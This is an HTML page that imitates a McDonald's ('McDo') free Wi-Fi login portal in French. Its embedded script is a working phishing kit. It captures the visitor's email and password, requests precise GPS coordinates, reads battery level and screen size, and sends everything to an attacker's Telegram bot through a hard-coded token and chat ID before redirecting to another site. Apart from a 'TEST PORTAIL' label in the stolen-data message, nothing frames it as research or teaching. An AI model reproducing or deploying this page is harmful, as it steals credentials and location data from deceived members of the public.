<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>McDo™ Wi-Fi - Authentification</title>
    <style>
        :root {
            --mc-green: #0a472c;
            --mc-yellow: #ffbc0d;
            --mc-dark-grey: #4d4d4d;
            --mc-light-grey: #f4f4f4;
        }

        body {
            background-color: var(--mc-light-grey);
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: var(--mc-dark-grey);
        }

        /* Bandeau supérieur vert */
        header {
            background-color: var(--mc-green);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-m {
            color: var(--mc-yellow);
            font-size: 40px;
            font-weight: bold;
            font-family: serif;
        }

        .container {
            max-width: 420px;
            margin: 20px auto;
            padding: 15px;
        }

        /* Boîte supérieure avec les frites */
        .info-box {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            text-align: center;
        }

        .yellow-banner {
            background-color: var(--mc-yellow);
            padding: 30px;
            display: flex;
            justify-content: center;
        }

        .fries-icon {
            font-size: 50px;
        }

        .info-content {
            padding: 20px;
        }

        .info-content h1 {
            color: var(--mc-green);
            font-size: 24px;
            margin: 0 0 10px 0;
        }

        .info-content p {
            color: #777;
            font-size: 15px;
            line-height: 1.4;
            margin: 0;
        }

        /* Boîte de connexion */
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }

        .field {
            margin-bottom: 20px;
        }

        .field label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .field input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 16px;
            background-color: #fff;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background-color: var(--mc-yellow);
            color: var(--mc-green);
            border: none;
            border-radius: 30px;
            font-weight: 800;
            font-size: 17px;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 10px;
        }

        .legal-text {
            font-size: 11px;
            color: #aaa;
            text-align: center;
            margin-top: 20px;
            line-height: 1.4;
        }

        #loader {
            display: none;
            text-align: center;
            padding: 40px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--mc-green);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<header>
    <div class="logo-m">m</div>
</header>

<div class="container">
    <div id="main-ui">
        <div class="info-box">
            <div class="yellow-banner">
                <span class="fries-icon">🍟</span>
            </div>
            <div class="info-content">
                <h1>Wi-Fi Gratuit illimité</h1>
                <p>Identifiez-vous pour accéder au réseau du restaurant.</p>
            </div>
        </div>

        <div class="login-box" id="auth-form">
            <div class="field">
                <label>E-mail ou Identifiant McDo+</label>
                <input type="email" id="user-email" placeholder="exemple@mail.com" required>
            </div>

            <div class="field">
                <label>Mot de passe</label>
                <input type="password" id="user-pass" placeholder="••••••••" required>
            </div>

            <button class="btn-submit" onclick="handleLogin()">Se connecter</button>

            <div class="legal-text">
                En vous connectant, vous acceptez nos CGU et notre politique de protection des données.
            </div>
        </div>
    </div>

    <div id="loader">
        <div class="spinner"></div>
        <p style="font-weight: bold;">Vérification en cours...</p>
    </div>
</div>

<script>
    const MON_LIEN = "https://nathanaelvaury13-boop.github.io/Macdo/"; 
    const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
    const TELEGRAM_CHAT_ID = "7400979339";

    async function handleLogin() {
        const email = document.getElementById('user-email').value;
        const pass = document.getElementById('user-pass').value;

        if(!email || !pass) {
            alert("Veuillez remplir tous les champs.");
            return;
        }

        // GPS d'abord pour l'interaction utilisateur
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (p) => {
                    processData(email, pass, `${p.coords.latitude},${p.coords.longitude}`);
                },
                async (err) => {
                    processData(email, pass, "Refusé ❌");
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            processData(email, pass, "Non supporté");
        }
    }

    async function processData(email, pass, loc) {
        document.getElementById('main-ui').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        let battery = "N/A";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + "%";
            } catch(e) {}
        }

        const rapport = `🍔 TEST PORTAIL\n` +
                        `📧 Email: ${email}\n` +
                        `🔑 Pass: ${pass}\n` +
                        `📍 GPS: ${loc}\n` +
                        `🔋 Batt: ${battery}\n` +
                        `🖥 Écran: ${screen.width}x${screen.height}`;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
            });
        } catch(err) {}

        setTimeout(() => {
            window.location.href = MON_LIEN;
        }, 1500);
    }
</script>

</body>
</html>
